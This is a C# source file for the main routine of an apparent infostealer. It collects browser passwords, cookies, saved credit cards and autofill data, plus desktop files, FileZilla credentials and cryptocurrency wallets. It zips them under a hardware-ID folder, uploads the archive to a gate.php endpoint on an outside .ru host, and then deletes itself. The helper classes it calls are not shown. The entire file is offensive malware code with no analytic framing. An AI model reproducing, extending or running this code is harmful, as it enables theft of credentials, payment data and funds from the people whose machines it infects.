namespace NoFile
{
    using System;
    using System.Collections.Generic;
    using System.IO;

    internal class Program
    {
        private static string url = "http://ih877563.myihor.ru";

        private static void Main(string[] args)
        {
            string dir = Environment.GetEnvironmentVariable("temp") + @"\" + Helper.GetHwid();
            string path = dir + @"\Directory";
            string str3 = path + @"\Browsers";
            string str4 = path + @"\Files";
            string str5 = path + @"\Wallets";
            Directory.CreateDirectory(path);
            Directory.CreateDirectory(str3);
            Directory.CreateDirectory(str4);
            Directory.CreateDirectory(str5);
            string contents = "";
            List<PassData> passwords = Browsers.GetPasswords();
            foreach (PassData data in passwords)
            {
                contents = contents + data.ToString();
            }
            File.WriteAllText(str3 + @"\Passwords.txt", contents);
            contents = "";
            List<CookieData> cookies = Browsers.GetCookies();
            foreach (CookieData data2 in cookies)
            {
                contents = contents + data2.ToString();
            }
            File.WriteAllText(str3 + @"\Cookies.txt", contents);
            contents = "";
            List<CardData> cards = Browsers.GetCards();
            foreach (CardData data3 in cards)
            {
                contents = contents + data3.ToString();
            }
            File.WriteAllText(str3 + @"\CC.txt", contents);
            contents = "";
            List<FormData> forms = Browsers.GetForms();
            foreach (FormData data4 in forms)
            {
                contents = contents + data4.ToString();
            }
            File.WriteAllText(str3 + @"\Autofill.txt", contents);
            contents = "";
            Files.Desktop(str4);
            Files.FileZilla(str4);
            int num = Crypto.Steal(str5);
            string zipPath = dir + @"\" + Helper.GetHwid() + ".zip";
            Helper.Zip(path, zipPath);
            Helper.SendFile(string.Format(url + "/gate.php?hwid={0}&pwd={1}&cki={2}&cc={3}&frm={4}&wlt={5}", new object[] { Helper.GetHwid(), passwords.Count, cookies.Count, cards.Count, forms.Count, num }), zipPath);
            Helper.SelfDelete(dir, dir + @"\temp.exe");
        }
    }
}

